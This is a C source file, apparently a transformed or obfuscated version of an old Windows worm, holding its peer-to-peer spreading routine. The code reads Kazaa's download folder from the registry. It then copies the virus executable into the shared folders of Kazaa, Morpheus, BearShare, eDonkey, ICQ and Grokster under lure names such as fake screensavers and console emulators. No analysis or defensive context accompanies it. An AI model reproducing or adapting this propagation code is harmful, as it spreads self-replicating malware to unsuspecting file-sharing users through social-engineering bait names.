#pragma optimize("", off)
#include "data_globals.h"
#include <windows.h>
#include <string.h>

void _P2PCopy(void)
{
    // Transform int i (unused, but we'll alias it anyway)
    volatile int i_buf[2] = {{0, (int)0}};
    volatile int *p_i = (volatile int *)&i_buf[0];

    // Transform DWORD size
    volatile DWORD size_buf[2] = {{0, (DWORD)0}};
    volatile DWORD *p_size = (volatile DWORD *)&size_buf[0];

    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Kazaa\\Transfer", 0, KEY_READ, &_hKey);
    (*p_size) = sizeof(_Kazaa);   // original used sizeof(Kazaa)
    RegQueryValueExA(_hKey, "DlDir0", NULL, NULL, (LPBYTE)_Kazaa, (LPDWORD)p_size);
    RegCloseKey(_hKey);

    // Original: if (Kazaa[0]>64 && Kazaa[0]<123)
    if (_Kazaa[0] > 64 && _Kazaa[0] < 123) {
        // Copy Kazaa to KazaaFull
        strcpy(_KazaaFull, _Kazaa);
        // Append the filename
        strcat(_KazaaFull, "\\Kira Kerner SCREENSAVER.Scr");

        CopyFileA(_VirusPath, _KazaaFull, FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\Morpheus\\My Shared Folder\\HOT SEXY SCREENSAVER.Scr", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\BearShare\\Shared\\XBOX EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\EDonkey2000\\Incoming\\PS2 EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\My Downloads\\NUDIE SCREENSAVER.Scr", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\ICQ\\Shared Files\\GAMECUBE EMU REALWORKING.EXE", FALSE);
        CopyFileA(_VirusPath, "\\Program Files\\Grokster\\My Grokster\\KOF2K2.zip.EXE", FALSE);
    }

    return;
}
#pragma optimize("", on)
